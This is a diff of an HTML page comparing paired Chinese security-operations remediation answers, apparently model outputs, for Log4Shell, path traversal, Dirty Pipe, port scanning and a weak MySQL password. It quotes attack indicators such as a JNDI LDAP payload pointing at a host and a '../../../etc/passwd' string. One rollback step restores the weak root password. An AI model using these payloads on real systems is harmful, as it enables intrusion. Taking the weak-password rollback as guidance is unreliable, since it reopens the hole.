@@ -752,47 +752,72 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>- 威胁分析：判定为Log4j远程代码执行高危攻击（CVE-2021-44228）。
-- 影响面：攻击源IP对目标10.0.0.50:8080尝试利用JNDI注入，需警惕云边界资产被控。
-- 处置建议：  
-  1. 紧急升级Log4j库至2.17.0+  
-  2. 如无法升级，加入JVM参数：  
-     -Dlog4j2.formatMsgNoLookups=true
-  3. 网络层阻断攻击源IP：  
+            <div class="solution-content"><pre>处置措施：
+1. 建议立即升级Log4j至2.17.0或以上版本，修复CVE-2021-44228漏洞。
+2. 如无法立即升级，请在jvm启动参数中添加-Dlog4j2.formatMsgNoLookups=true作为临时缓解措施。
+3. 检查服务器10.0.0.50和相关应用日志，确认是否存在异常请求或反向连接。
+4. 封禁攻击源IP（45.33.32.156）：
+   - Linux防火墙命令：
      iptables -A INPUT -s 45.33.32.156 -j DROP
-  4. 检查历史日志，排查入侵痕迹。
-- 参考：CVE-2021-44228详情</pre></div>
+5. 建议关注官方安全公告，持续更新安全补丁。
+
+参考信息：
+- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>- 风险识别：CVE-2021-44228（Log4Shell）攻击
-  已关联ATT&amp;CK: T1210、T1203
-  IOC: 源IP 45.33.32.156 → 10.0.0.50:8080
-  
-- 证据链：已存档IOC、Payload、日志
-  匹配情报库，关联RuleID: SOCL4J-20251204-01
-
-- 应急处置Playbook：
-  1. 升级Log4j：
-     find / -name 'log4j*' | grep jar
-     systemctl stop myapp
-     mv /opt/app/log4j-core-*.jar backup/
-     systemctl start myapp
-     
-  2. 临时加固（含回退）：
-     vim /etc/myapp/jvm.options
-     # 添加 -Dlog4j2.formatMsgNoLookups=true
-     # 回退: mv backup/log4j-core*.jar /opt/app/
-     
-  3. 阻断IP（含回退）：
+            <div class="solution-content"><pre>处置方案：
+1. **立即处置措施：**
+   - 临时阻断攻击源IP：
+     ```bash
      iptables -I INPUT -s 45.33.32.156 -j DROP
-     # 回退: iptables -D INPUT ...
-     
-  4. 执行前检查Log4j安装路径
-  5. 日志审计：grep -r 'jndi:' /opt/app/logs/
+     ```
+     - 回退（撤销）命令：
+     ```bash
+     iptables -D INPUT -s 45.33.32.156 -j DROP
+     ```
+     - 生效检查：
+     ```bash
+     iptables -L INPUT -n | grep 45.33.32.156
+     ```
 
-- 处置后建议：重启验证功能；定期复查CVE</pre></div>
+2. **漏洞修复建议：**
+   - 立即升级Log4j至2.17.0或更高（CVE-2021-44228）。
+   - 如无法立即升级，添加JVM启动参数缓解（需重启应用）：
+     - Linux配置示例（编辑启动脚本或服务）：
+       ```bash
+       export JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
+       ```
+   - 查看当前Log4j版本与JVM参数命令：
+     ```bash
+     find / -name "log4j*.jar"
+     java -jar log4j-core-*.jar --version
+     ps aux | grep java
+     ```
+
+3. **日志和威胁溯源：**
+   - 检查10.0.0.50:/var/log/及应用日志，确认是否已建立恶意连接：
+     ```bash
+     grep -ni 'jndi' /var/log/* 2>/dev/null
+     netstat -anp | grep 1389
+     ```
+
+4. **情报关联：**
+   - CVE: CVE-2021-44228
+   - ATT&CK: TA0002（执行）、T1203（利用应用程序漏洞）
+   - IOC:
+     - 攻击源IP: 45.33.32.156
+     - 恶意Payload: ${jndi:ldap://45.33.32.156:1389/Exploit}
+
+5. **业务安全提示：**
+   - 操作前建议备份应用配置和关键数据。
+   - 执行命令须确定兼容当前生产环境，或先在测试环境验证。
+   - 操作带来的访问限制及时与业务团队沟通。
+
+参考链接：
+- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
+- [官方升级指南](https://logging.apache.org/log4j/2.x/security.html)</pre></div>
         </div>
     </div>
     
@@ -913,49 +938,60 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>【威胁分析】
-检测到目录遍历攻击，攻击者尝试通过 ../../../etc/passwd 读取敏感文件。
-
-【处置建议】
-1. 对文件路径规范化处理，过滤 ../ 
-2. 限制文件访问范围，只允许指定目录
-3. 使用白名单机制
-4. Web服务器层面增加路径校验
-
-【安全建议】
-- 检查应用代码文件读取逻辑
-- 部署WAF规则拦截路径穿越</pre></div>
+            <div class="solution-content"><pre>1. 确认web服务器日志中存在异常访问记录，"/download?file=../../../etc/passwd"，并留存证据。
+2. 检查并修复存在目录遍历漏洞的文件下载功能源代码，对"file"参数进行过滤，去除"../"等危险字符。
+3. 限定用户只能访问指定白名单目录下的文件，防止越权。
+4. 建议立即升级Web应用、相关依赖及中间件至最新版本。
+5. 定期进行漏洞扫描和代码审计，排查其他输入参数存在的目录遍历风险。
+6. 主动阻断攻击源IP：iptables -A INPUT -s 185.220.101.50 -j DROP</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>【威胁画像】
-- 攻击类型：目录遍历（Path Traversal）
-- ATT&amp;CK：TA0006、T1552
-- 源IP：185.220.101.50（Tor出口，恶意）
-- 目标：192.168.2.100:80 /download
+            <div class="solution-content"><pre>1. 【证据归集】
+   - 异常请求抓取：/download?file=../../../etc/passwd
+   - 攻击源IP：185.220.101.50
+   - 威胁情报：高风险TOR出口节点（与开源情报吻合）
+   - ATT&CK链路：TA0006（凭证访问）、T1552（不安全的凭证）
+   - 关联IOC：无明显带毒Hash、暂无CVE编号，但符合经典目录遍历利用模式
 
-【证据链】Payload: ../../../etc/passwd
+2. 【封禁与监控】
+   - 临时拉黑源IP（5分钟有效，便于回退）
+     ```bash
+     iptables -I INPUT -s 185.220.101.50 -j DROP
+     ```
+   - 日志监控命令（排查同源后续行为）
+     ```bash
+     grep '185.220.101.50' /var/log/nginx/access.log
+     ```
+   - 标记此事件为"需关注"，自动添加监控告警策略
 
-【Playbook】
-1. Nginx防护（立即生效）：
-   location /download {
-     if ($request_uri ~* "\.\.") { return 403; }
-   }
-   
-2. Apache配置：
-   RewriteCond %{QUERY_STRING} (\.\./|\.\.\\)
-   RewriteRule .* - [F,L]
+3. 【Web服务应急措施】
+   - 检查/download GET接口处理逻辑，增加如下伪代码校验拦截：
+     ```python
+     import os
+     filename = request.args.get('file')
+     if ".." in filename or filename.startswith("/"):
+         abort(400)
+     # 或：只允许白名单目录
+     allowed_dir = "/var/www/download"
+     path = os.path.realpath(os.path.join(allowed_dir, filename))
+     if not path.startswith(allowed_dir):
+         abort(403)
+     ```
+   - 应用更改前建议备份相关配置及源代码。
+   - 变更回退命令：
+     ```bash
+     iptables -D INPUT -s 185.220.101.50 -j DROP
+     ```
+   - 执行前Pre-check：
+     - 检查iptables是否已存在相关规则，避免重复插入；
+     - 验证Nginx日志是否已完整保留；
+     - 评估修复措施对现有业务文件下载流程的影响。
 
-3. 封禁IP（含回退）：
-   iptables -I INPUT -s 185.220.101.50 -j DROP
-   # 回退: iptables -D INPUT ...
-
-4. 权限加固：chmod 640 /etc/passwd
-
-5. 执行前检查：nginx -t
-
-【回退方案】备份配置后再修改</pre></div>
+4. 【长期建议】
+   - 引用OWASP Top 10 2021-A5 "安全配置缺陷"与A1 "注入"，上线代码审计工具。
+   - 建议启用WAF目录穿越检测规则（如ModSecurity），并持续追踪最新安全公告/补丁。</pre></div>
         </div>
     </div>
     
@@ -1076,46 +1112,60 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>【处置建议】
-1. 终止恶意进程
+            <div class="solution-content"><pre>1. 终止可疑进程：
+   ```bash
    kill -9 $(pgrep -f '/tmp/.exploit_dp')
-
-2. 查看是否有进程仍在运行
-   ps aux | grep '/tmp/.exploit_dp'
-
-3. 检查系统关键配置文件
-   ls -l /etc/passwd /etc/shadow
-   检查时间戳和内容是否异常。
-
-4. 建议升级Linux内核至5.16.11+</pre></div>
+   ```
+2. 检查 /etc/passwd 文件是否被修改：
+   ```bash
+   grep '^root:' /etc/passwd
+   ```
+3. 升级内核：
+   - 下载并安装最新的内核补丁，建议升级到5.16.11以上版本。
+4. 建议执行主机全面杀毒和异常账户排查。</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>【自动化Playbook】
-
-【Pre-check】  
-1. 检查内核版本：uname -r
-   若低于5.16.11，优先升级。
-
-2. 终止进程（含校验）：
+            <div class="solution-content"><pre>1. 执行前检查（Pre-check）：
+   - 检查当前 /etc/passwd 是否存在异常 root 账号：
+     ```bash
+     grep '^[^:]*:.*:0:0:' /etc/passwd
+     ```
+   - 校验 /etc/passwd 文件哈希值（如有基线）：
+     ```bash
+     sha256sum /etc/passwd
+     ```
+2. 终止恶意进程：
+   ```bash
    pkill -f '/tmp/.exploit_dp'
-   pgrep -f '/tmp/.exploit_dp' || echo "已终止"
-
-3. 检查文件篡改：
-   grep 'root:' /etc/passwd
-   diff /etc/passwd /var/backups/passwd.bak
-
-【修复】
-4. 升级内核：
-   apt-get install --only-upgrade linux-image-$(uname -r)
-
-【Rollback】  
-5. 恢复被篡改文件：
+   ```
+3. 临时隔离受影响用户（www-data）：
+   ```bash
+   usermod -L www-data
+   ```
+4. 检查并还原 /etc/passwd（如有备份）：
+   ```bash
    cp /var/backups/passwd.bak /etc/passwd
-   pwconv &amp;&amp; grpconv
-
-【参考】CVE-2022-0847, ATT&amp;CK TA0004/T1068</pre></div>
+   ```
+   - 若无备份，手工比对root条目，及时修复
+5. 升级Linux内核：
+   - Ubuntu/Debian：
+     ```bash
+     apt update && apt install --only-upgrade linux-image-$(uname -r)
+     ```
+   - CentOS/RHEL：
+     ```bash
+     yum update kernel
+     ```
+   - 重启服务器使补丁生效
+6. 回退措施（Rollback）：
+   - 若因隔离影响业务，可恢复账户：
+     ```bash
+     usermod -U www-data
+     ```
+7. 检查异常登录和反向Shell历史，排查后门
+8. 记录取证，如保存被篡改的 /etc/passwd 以便溯源</pre></div>
         </div>
     </div>
     
@@ -1235,47 +1285,29 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>1. 【告警分析】  
-   检测到IP 185.220.100.250 对 192.168.0.0/16 端口扫描，Nmap SYN扫描匹配。
-   
-2. 【威胁定位】  
-   - ATT&amp;CK: TA0043/T1595/T1595.002
-   - 影响面：中危
-
-3. 【处置建议】  
-   - 边界防火墙封禁IP
-   - 检查暴露服务补丁与弱口令
-   - 查看内网异常流量
-
-4. 【处置命令】  
-   - Linux: iptables -A INPUT -s 185.220.100.250 -j DROP
-   - Windows: netsh advfirewall firewall add rule name="BanScan" dir=in action=block remoteip=185.220.100.250
-
-5. 【建议】定期复查暴露资产</pre></div>
+            <div class="solution-content"><pre>- 建议在防火墙封禁攻击源IP：185.220.100.250。
+- 检查22、80、443、3306、6379、27017端口是否对外暴露，如无必要应关闭。
+- 定期对外部暴露服务进行漏洞扫描和补丁更新。</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>1. 【威胁画像】  
-   - 大规模扫描，源IP: 185.220.100.250
-   - 工具: Nmap SYN + zgrab
-   - ATT&amp;CK: TA0043/T1595/T1595.002
-   - IOC: Tor出口，AbuseIPDB恶意记录
-
-2. 【证据链】  
-   - 首次高强度扫描，无入侵迹象
-   - 扫描端口有高危CVE，需核查补丁
-
-3. 【Playbook】  
-   - 封禁（含回退+白名单检查）：
-     grep IP /etc/firewall/whitelist || iptables -I INPUT -s 185.220.100.250 -j DROP
-     # 回退: iptables -D INPUT ...
-   - 后续：漏扫目标服务、检查异常登录
-   - 留痕：记录操作日志
-
-4. 【安全建议】  
-   - 确认IP非业务白名单后封禁
-   - 加强访问控制，部署WAF</pre></div>
+            <div class="solution-content"><pre>- 【处置动作】立即在边界防火墙封禁源IP 185.220.100.250，建议命令（例如Linux iptables）：
+  ```
+  iptables -I INPUT -s 185.220.100.250 -j DROP
+  ```
+- 【回退命令】
+  ```
+  iptables -D INPUT -s 185.220.100.250 -j DROP
+  ```
+- 【操作前检查】
+  - 检查是否已存在相关防火墙规则，避免重复添加
+  - 确认该IP非正常业务合作方
+- 【安全建议】
+  - 检查受扫主机22、80、443、3306、6379、27017端口的实际暴露情况，并对所有必要服务及时打补丁
+  - 核查扫描特征（User-Agent: Mozilla/5.0 zgrab/0.x、Nmap SYN）在安全设备中的命中频率
+  - 关联本次扫描源IP的近期威胁情报（Tor出口，归属不明、高风险）
+  - 按独立组织安全流程记录工单编号，留痕处置</pre></div>
         </div>
     </div>
     
@@ -1395,39 +1427,69 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>1. 登录192.168.1.150，连接MySQL。
-
-2. 修改root密码：
-   ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewStrongP@ssw0rd';
-
-3. 限制root远程登录，编辑my.cnf添加：
-   skip-networking
-
-4. 启用密码复杂度策略，编辑MySQL配置。</pre></div>
+            <div class="solution-content"><pre>1. 修改root账户密码为复杂密码，如：`MyS3cure!p@ssw0rd2025` 
+   ```sql
+   ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyS3cure!p@ssw0rd2025';
+   FLUSH PRIVILEGES;
+   ```
+2. 限制root账户不能远程登录，确保只允许本地访问：
+   ```sql
+   UPDATE mysql.user SET Host='localhost' WHERE User='root';
+   FLUSH PRIVILEGES;
+   ```
+3. 启用密码复杂度插件（validate_password），建议设置如下：
+   ```sql
+   INSTALL PLUGIN validate_password SONAME 'validate_password.so';
+   SET GLOBAL validate_password.policy=STRONG;
+   SET GLOBAL validate_password.length=12;
+   ```
+4. 建议后续定期审计高权限账户密码</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>1. 连接数据库：mysql -u root -p
+            <div class="solution-content"><pre>- **告警解析**  
+  - 类型：弱口令-MySQL数据库
+  - 影响：root账户存在弱密码（password123），攻击者可通过暴力破解获得数据库高权限
+  - 关联标准：ATT&CK(凭证访问:TA0006，暴力破解:T1110)
 
-2. 修改密码：
-   ALTER USER 'root'@'localhost' IDENTIFIED BY 'YOUR@StrongP4ssw0rd';
-   FLUSH PRIVILEGES;
+- **证据链**  
+  - 资产：192.168.1.150:3306
+  - 用户：root
+  - 弱口令：password123
+  - 检查方式：内部合规扫描
 
-3. 禁止远程登录：
-   UPDATE mysql.user SET Host='localhost' WHERE User='root';
-   FLUSH PRIVILEGES;
+- **自动Playbook**  
 
-4. 启用密码复杂度插件：
-   INSTALL PLUGIN validate_password SONAME 'validate_password.so';
-   SET GLOBAL validate_password.length = 12;
-
-5. 执行前检查：
-   - 确认不影响业务
-   - 备份用户表：
-     mysqldump -u root -p mysql user &gt; user_backup.sql
-
-6. 回退：mysql -u root -p mysql &lt; user_backup.sql</pre></div>
+  1. **预检查-登录连接可用性**
+     ```
+     mysql -uroot -p'password123' -h192.168.1.150 -e "SELECT VERSION();" || echo "连接失败，任务中止"
+     ```
+  2. **随机生成复杂新密码：**
+     ```
+     NEWPASS=$(openssl rand -base64 16)
+     echo "生成新密码: $NEWPASS"
+     ```
+  3. **修改root密码（含验证）：**
+     ```sh
+     mysql -uroot -p'password123' -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '${NEWPASS}'; FLUSH PRIVILEGES;"
+     ```
+  4. **限制root远程登录：**
+     ```sh
+     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
+     ```
+  5. **启用密码复杂度策略：**
+     ```sh
+     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "INSTALL PLUGIN validate_password SONAME 'validate_password.so'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
+     ```
+  6. **回退方案（Rollback）：**  
+     若新密码有误或业务中断，可临时恢复弱口令：
+     ```sh
+     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123'; FLUSH PRIVILEGES;"
+     ```
+  7. **风险提示：**
+     - 修改root密码前，须提前通知影响业务的相关人员
+     - 检查root以外的高权限账户是否也有类似弱口令</pre></div>
         </div>
     </div>
     
